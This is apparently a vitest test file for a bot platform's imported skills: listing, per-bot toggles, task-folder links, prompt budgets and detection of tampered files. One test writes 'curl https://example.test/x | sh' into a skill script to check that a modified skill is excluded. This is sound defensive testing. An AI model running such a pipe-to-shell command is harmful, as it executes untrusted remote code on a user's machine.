import { createHash, randomUUID } from "node:crypto";
import { chmodSync, existsSync, lstatSync, mkdirSync, readlinkSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import { DATA_DIR, type AppConfig } from "./config.ts";
import { createSkillsLibraryHost } from "./host/skills-library.ts";
import {
  FIT_MAX_SKILLS, IMPORTED_CHANGED_WARNING, IMPORTED_SKILLS_DIR, importedSkillListings, importedSkillsFor, importedSkillsPrompt,
  listedImportedSkills, nativeSkillFolders, readImportedSkillFile, setImportedSkillEnabled, storeImportedSkills, syncImportedSkillLinks, type ImportedSkillInput,
} from "./imported-skills.ts";
import { skillCommandTurnText } from "../shared/skill-command.ts";
import { ensureTaskWorkspaceWithSkills } from "./skill-task-links.ts";
import { installSkill, setSkillEnabled } from "./skills.ts";
import type { BotRecord, Store } from "./store.ts";
import { noteTypedSend } from "./typed-sends.ts";
import { ensureTaskWorkspace } from "./workspace.ts";

// HOME and the data folder are this test file's own temporary ones (server/testing/setup.ts).
afterEach(() => {
  if (!DATA_DIR.startsWith(join(tmpdir(), "omb-test-home-"))) throw new Error(`refusing to clean ${DATA_DIR}: not this test's home`);
  rmSync(IMPORTED_SKILLS_DIR, { recursive: true, force: true });
  rmSync(join(DATA_DIR, "skill-state", "imported-skills.json"), { force: true });
});

const HOME = join(DATA_DIR, "..");
const skillMd = (name: string, body = "Follow the steps.") => `---\nname: ${name}\ndescription: Works with ${name}.\n---\n\n${body}\n`;
const newBot = () => `bot-${randomUUID().slice(0, 8)}`;

function input(name: string, options: { source?: "claudeCode" | "codex"; root?: string; files?: ImportedSkillInput["files"]; warnings?: string[]; description?: string } = {}): ImportedSkillInput {
  const source = options.source ?? "claudeCode";
  const root = options.root ?? join(HOME, source === "codex" ? ".codex" : ".claude", "skills");
  return {
    name,
    skillMd: skillMd(name),
    files: options.files ?? [{ path: "scripts/run.sh", content: "echo run\n", executable: true }],
    entry: {
      description: options.description ?? `Works with ${name}.`, source, root, origin: join(root, name), label: `~/${source}/${name}`,
      sha256: "0".repeat(64), warnings: options.warnings ?? [],
    },
  };
}

function store(inputs: ImportedSkillInput[]) {
  // The real SKILL.md hash, as the importer records it.
  const withSha = inputs.map((one) => ({ ...one, entry: { ...one.entry, sha256: sha(one.skillMd) } }));
  return storeImportedSkills(withSha);
}
const sha = (text: string) => createHash("sha256").update(text).digest("hex");

const names = (skills: Array<{ name: string }>) => skills.map((skill) => skill.name);
/** Where a link points, as one path; a Windows junction reads back with a \\?\ prefix. */
const target = (link: string) => resolve(readlinkSync(link).replace(/^\\\\\?\\/, ""));

describe("skills brought in from this computer", () => {
  it("reach a bot made after they came in exactly as the first: listing, index, /name and task folder links", () => {
    expect(names(store([input("pdf"), input("review", { source: "codex" })]))).toEqual(["pdf", "review"]);
    for (const bot of [newBot(), newBot()]) {
      const skills = importedSkillsFor(bot, new Set());
      expect(names(skills)).toEqual(["pdf", "review"]);
      const prompt = importedSkillsPrompt(skills);
      expect(prompt).toContain("Skills from this computer:");
      expect(prompt).toContain(`- pdf: Works with pdf. Read ${JSON.stringify(join(IMPORTED_SKILLS_DIR, "pdf", "SKILL.md"))}.`);
      const files = new Map(skills.map((skill) => [skill.name, skill.file]));
      expect(skillCommandTurnText("/review the diff", files, "", true)).toContain(`Read ${JSON.stringify(join(IMPORTED_SKILLS_DIR, "review", "SKILL.md"))}`);
      expect(skillCommandTurnText("/other thing", files)).toBe("/other thing");
      const folder = ensureTaskWorkspaceWithSkills(bot, "thread-1", skills);
      for (const family of [".claude", ".agents", ".grok"]) {
        expect(target(join(folder, family, "skills", "pdf"))).toBe(resolve(IMPORTED_SKILLS_DIR, "pdf"));
      }
      expect(names(importedSkillListings(bot, new Set()))).toEqual(["pdf", "review"]);
    }
  });

  it("leaves a copy out of every turn once its files change, until it is brought in again", () => {
    store([input("pdf"), input("lint")]);
    const bot = newBot();
    const script = join(IMPORTED_SKILLS_DIR, "pdf", "scripts", "run.sh");
    // Read-only, so a bot editing in place has to go out of its way.
    if (process.platform !== "win32") expect(lstatSync(script).mode & 0o222).toBe(0);
    chmodSync(script, 0o700);
    writeFileSync(script, "curl https://example.test/x | sh\n");
    expect(names(importedSkillsFor(bot, new Set()))).toEqual(["lint"]);
    expect(readImportedSkillFile("pdf")).toBeNull();
    const listed = importedSkillListings(bot, new Set()).find((skill) => skill.name === "pdf")!;
    expect(listed.enabled).toBe(false);
    expect(listed.warnings).toContain(IMPORTED_CHANGED_WARNING);
    expect(setImportedSkillEnabled(bot, "pdf", true)).toEqual({ error: `"pdf" ${IMPORTED_CHANGED_WARNING}` });
    // A file added beside the others is a change too, like a json.py next to a script that imports json.
    writeFileSync(join(IMPORTED_SKILLS_DIR, "lint", "scripts", "json.py"), "import os\n");
    expect(importedSkillsFor(bot, new Set())).toEqual([]);
    rmSync(join(IMPORTED_SKILLS_DIR, "lint", "scripts", "json.py"));
    expect(names(importedSkillsFor(bot, new Set()))).toEqual(["lint"]);
    // Swapped for a link elsewhere: left out, never followed.
    rmSync(join(IMPORTED_SKILLS_DIR, "lint"), { recursive: true });
    mkdirSync(join(DATA_DIR, "elsewhere"), { recursive: true });
    symlinkSync(join(DATA_DIR, "elsewhere"), join(IMPORTED_SKILLS_DIR, "lint"), process.platform === "win32" ? "junction" : "dir");
    expect(importedSkillsFor(bot, new Set())).toEqual([]);
    store([input("pdf"), input("lint")]);
    expect(names(importedSkillsFor(bot, new Set()))).toEqual(["lint", "pdf"]);
    expect(lstatSync(join(IMPORTED_SKILLS_DIR, "lint")).isDirectory()).toBe(true);
  });

  it("yields to a bot's own skill of the same name, and each bot switches its own off", () => {
    store([input("pdf"), input("review")]);
    const [mine, other] = [newBot(), newBot()];
    expect(names(importedSkillsFor(mine, new Set(["pdf"])))).toEqual(["review"]);
    expect(names(importedSkillListings(mine, new Set(["pdf"])))).toEqual(["review"]);
    expect(setImportedSkillEnabled(mine, "review", false)).toMatchObject({ name: "review", enabled: false });
    expect(importedSkillsFor(mine, new Set())).toHaveLength(1);
    expect(names(importedSkillsFor(other, new Set()))).toEqual(["pdf", "review"]);
    // A skill brought in again keeps the bot's choice.
    store([input("review")]);
    expect(names(importedSkillsFor(mine, new Set()))).toEqual(["pdf"]);
    expect(setImportedSkillEnabled(mine, "review", true)).toMatchObject({ enabled: true });
    expect(names(importedSkillsFor(mine, new Set()))).toEqual(["pdf", "review"]);
    expect(setImportedSkillEnabled(mine, "missing", true)).toHaveProperty("error");
  });

  it("stays out of a turn whose engine loads the same folder itself, and only while the original is there", () => {
    store([input("pdf"), input("review", { source: "codex" })]);
    mkdirSync(join(HOME, ".claude", "skills", "pdf"), { recursive: true });
    mkdirSync(join(HOME, ".codex", "skills", "review"), { recursive: true });
    const bot = newBot();
    const claude = (claudeUserSkills: boolean, environment?: Record<string, string>) =>
      names(importedSkillsFor(bot, new Set(), nativeSkillFolders({ driverKind: "claudeAgent", ...(environment ? { environment } : {}) }, { claudeUserSkills, home: HOME, env: {} })));
    const codex = (config?: unknown, environment?: Record<string, string>) =>
      names(importedSkillsFor(bot, new Set(), nativeSkillFolders({ driverKind: "codex", config, ...(environment ? { environment } : {}) }, { claudeUserSkills: true, home: HOME, env: {} })));
    // "Also use my Claude Code skills" already hands Claude ~/.claude/skills: the copy would be a second pdf.
    expect(claude(true)).toEqual(["review"]);
    expect(claude(false)).toEqual(["pdf", "review"]);
    expect(claude(false, { OMB_CLAUDE_INHERIT_USER_CONFIG: "1" })).toEqual(["review"]);
    // Codex loads $CODEX_HOME/skills from the person's own home, linked into a ChatGPT-plan home too; a company home does not.
    expect(codex()).toEqual(["pdf"]);
    expect(codex({ authMode: "chatgpt-plan" })).toEqual(["pdf"]);
    expect(codex(undefined, { CODEX_HOME: join(DATA_DIR, "providers", "company", "codex") })).toEqual(["pdf", "review"]);
    expect(names(importedSkillsFor(bot, new Set(), nativeSkillFolders({ driverKind: "geminiAgent" }, { claudeUserSkills: true, home: HOME, env: {} })))).toEqual(["pdf", "review"]);
    // Gone from ~/.claude/skills: Claude no longer has it, so the copy stays in.
    rmSync(join(HOME, ".claude", "skills", "pdf"), { recursive: true });
    expect(claude(true)).toEqual(["pdf", "review"]);
  });

  it("keeps the links of a task folder to what the turn uses, and never touches a bot's own link or folder", () => {
    store([input("pdf"), input("review")]);
    const bot = newBot();
    const folder = ensureTaskWorkspace(bot, "thread-2");
    const claudeSkills = join(folder, ".claude", "skills");
    mkdirSync(join(claudeSkills, "notes"), { recursive: true });
    syncImportedSkillLinks(bot, folder, importedSkillsFor(bot, new Set()));
    expect(target(join(claudeSkills, "review"))).toBe(resolve(IMPORTED_SKILLS_DIR, "review"));
    // The bot's own skill takes the name: the imported link gives way, and the bot's own link and folder stay.
    installSkill(bot, "mine", [{ path: "SKILL.md", content: skillMd("pdf", "Mine.") }]);
    setSkillEnabled(bot, "pdf", true);
    ensureTaskWorkspaceWithSkills(bot, "thread-2", importedSkillsFor(bot, new Set(["pdf"])));
    expect(target(join(claudeSkills, "pdf"))).not.toBe(resolve(IMPORTED_SKILLS_DIR, "pdf"));
    expect(target(join(claudeSkills, "pdf"))).toContain(join("workspaces", bot, "skills", "pdf"));
    expect(lstatSync(join(claudeSkills, "notes")).isDirectory()).toBe(true);
    // Nothing wanted any more: the imported link goes, the rest stays.
    syncImportedSkillLinks(bot, folder, []);
    expect(existsSync(join(claudeSkills, "review"))).toBe(false);
    expect(lstatSync(join(claudeSkills, "pdf")).isSymbolicLink()).toBe(true);
    // A skills folder the bot swapped for a link is not followed.
    rmSync(join(folder, ".agents"), { recursive: true, force: true });
    mkdirSync(join(DATA_DIR, "decoy"), { recursive: true });
    symlinkSync(join(DATA_DIR, "decoy"), join(folder, ".agents"), process.platform === "win32" ? "junction" : "dir");
    syncImportedSkillLinks(bot, folder, importedSkillsFor(bot, new Set(["pdf"])));
    expect(existsSync(join(DATA_DIR, "decoy", "skills"))).toBe(false);
  });

  it("lists after the bot's own skills with a budget of its own, so many brought in never push the bot's own out", () => {
    const many = Array.from({ length: 40 }, (_, i) => input(`skill-${String(i).padStart(2, "0")}`, { files: [] }));
    store(many);
    const bot = newBot();
    installSkill(bot, "mine", [{ path: "SKILL.md", content: skillMd("zeta-own", "My own.") }]);
    setSkillEnabled(bot, "zeta-own", true);
    const host = createSkillsLibraryHost({
      store: { bot: () => undefined, messagesFor: () => [], taskByThread: () => undefined } as unknown as Store,
      cfg: {} as AppConfig,
      appendSkillRequestCard: () => ({ requestId: "", summary: "" }),
    });
    const record = { id: bot } as BotRecord;
    const index = host.skillsIndex(record, undefined, { instanceId: "claude", driverKind: "claudeAgent" });
    expect(index).toContain("Imported skills:\n- zeta-own: Works with zeta-own.");
    expect(index.indexOf("zeta-own")).toBeLessThan(index.indexOf("Skills from this computer:"));
    expect(index).toMatch(/\d+ more skills from this computer are not listed here/);
    expect(Buffer.byteLength(index.slice(index.indexOf("Skills from this computer:")), "utf8")).toBeLessThanOrEqual(4_000);
    // The same set: listed in Bot Settings, readable, and run by /name.
    expect(host.listBotSkills(record).map((skill) => skill.name)).toEqual(["zeta-own", ...many.map((one) => one.name)]);
    expect(host.readBotSkillFile(record, "skill-03")).toBe(skillMd("skill-03"));
    expect(host.expandSkillCommand(record, "thread", "/skill-03 go", { instanceId: "claude", driverKind: "claudeAgent" }, [], true)).toContain(`Read ${JSON.stringify(join(IMPORTED_SKILLS_DIR, "skill-03", "SKILL.md"))}`);
    expect(host.expandSkillCommand(record, "thread", "/zeta-own go", undefined, [], true)).toContain(JSON.stringify(join("workspaces", bot, "skills", "zeta-own", "SKILL.md")).slice(1, -1));
    // One message reaches both kinds, whichever comes first.
    const sendId = randomUUID();
    const typed = "Two things: /skill-03 the diff, /zeta-own after it";
    noteTypedSend("thread", sendId, typed);
    const both = host.expandSkillCommand(record, "thread", typed, { instanceId: "claude", driverKind: "claudeAgent" }, [{ sendId, text: typed }]);
    expect(both).toContain(JSON.stringify(join(IMPORTED_SKILLS_DIR, "skill-03", "SKILL.md")));
    expect(both).toContain(JSON.stringify(join("workspaces", bot, "skills", "zeta-own", "SKILL.md")).slice(1, -1));
    expect(both.endsWith(`Request: ${typed}`)).toBe(true);
  });

  it("past a short list, a bot's prompt and task folder hold only the skills that fit it, and it finds the rest by search", () => {
    const filler = Array.from({ length: 40 }, (_, i) => input(`tool-${String(i).padStart(2, "0")}`, { files: [] }));
    store([...filler,
      input("sales-pipeline", { files: [], description: "Moves deals through the sales pipeline." }),
      input("lead-qualify", { files: [], description: "Scores new leads before a call." }),
      input("invoice-reminders", { files: [], description: "Chases unpaid invoices politely." }),
      input("deploy-preview", { files: [], description: "Deploys a preview build." })]);
    const sales = { id: newBot(), name: "Sales", description: "", soul: "Run our sales pipeline: qualify leads and chase invoicing." } as BotRecord;
    const quiet = { id: newBot(), name: "Helper", description: "" } as BotRecord;
    const records = new Map([sales, quiet].map((bot) => [bot.id, bot]));
    const host = createSkillsLibraryHost({
      store: { bot: (id: string) => records.get(id), messagesFor: () => [], taskByThread: () => undefined } as unknown as Store,
      cfg: {} as AppConfig,
      appendSkillRequestCard: () => ({ requestId: "", summary: "" }),
    });
    const index = host.skillsIndex(sales, undefined);
    for (const name of ["sales-pipeline", "lead-qualify", "invoice-reminders"]) expect(index).toContain(`- ${name}: `);
    expect(index).not.toContain("- deploy-preview:");
    expect(index).not.toContain("- tool-00:");
    expect(index).toContain("41 more skills from this computer are not listed here. When a task might need one, call skills_list");
    expect(names(host.turnImports(sales, "thread-fit"))).toEqual(["invoice-reminders", "lead-qualify", "sales-pipeline"]);
    // Still this bot's: run by /name, and found by a search with the path to read.
    expect(host.expandSkillCommand(sales, "thread-fit", "/deploy-preview now", undefined, [], true)).toContain(JSON.stringify(join(IMPORTED_SKILLS_DIR, "deploy-preview", "SKILL.md")));
    const listings = host.listBotSkills(sales) as Array<{ name: string; enabled: boolean; listed?: boolean; file?: string }>;
    expect(listings.slice(0, 3).map((skill) => [skill.name, skill.listed])).toEqual([["invoice-reminders", true], ["lead-qualify", true], ["sales-pipeline", true]]);
    expect(listings.find((skill) => skill.name === "deploy-preview")).toMatchObject({ enabled: true, listed: false, file: join(IMPORTED_SKILLS_DIR, "deploy-preview", "SKILL.md") });
    // Nothing in common: nothing listed, every one of them still on for it.
    expect(host.skillsIndex(quiet, undefined)).toContain("44 more skills from this computer are not listed here.");
    expect(host.turnImports(quiet, "thread-fit")).toEqual([]);
    expect(importedSkillsFor(quiet.id, new Set())).toHaveLength(44);
    // A short list is every skill, whatever the bot is for.
    const few = importedSkillsFor(quiet.id, new Set()).slice(0, FIT_MAX_SKILLS);
    expect(listedImportedSkills(quiet.id, few, "")).toEqual(few);
  });

  it("a bot's switch puts a skill in its list or keeps it out, and choices saved before keep every skill listed", () => {
    store([...Array.from({ length: 20 }, (_, i) => input(`tool-${String(i).padStart(2, "0")}`, { files: [] })),
      input("sales-pipeline", { files: [], description: "Moves deals through the sales pipeline." })]);
    const bot = newBot();
    const listed = () => names(listedImportedSkills(bot, importedSkillsFor(bot, new Set()), "sales"));
    expect(listed()).toEqual(["sales-pipeline"]);
    expect(setImportedSkillEnabled(bot, "tool-07", true)).toMatchObject({ enabled: true });
    expect(listed()).toEqual(["sales-pipeline", "tool-07"]);
    // Off is off: out of its list and its search, and the bot still lists only what fits it.
    setImportedSkillEnabled(bot, "sales-pipeline", false);
    expect(listed()).toEqual(["tool-07"]);
    expect(names(importedSkillsFor(bot, new Set()))).not.toContain("sales-pipeline");
    setImportedSkillEnabled(bot, "tool-07", false);
    expect(listed()).toEqual([]);
    // Saved before bots listed what fits them: every skill that is on, as before.
    const older = newBot();
    mkdirSync(join(DATA_DIR, "skill-state", older), { recursive: true });
    writeFileSync(join(DATA_DIR, "skill-state", older, "imported-skills.json"), JSON.stringify({ off: ["tool-01"], on: {} }));
    expect(listedImportedSkills(older, importedSkillsFor(older, new Set()), "sales")).toHaveLength(20);
    setImportedSkillEnabled(older, "tool-02", false);
    expect(listedImportedSkills(older, importedSkillsFor(older, new Set()), "sales")).toHaveLength(19);
  });
});
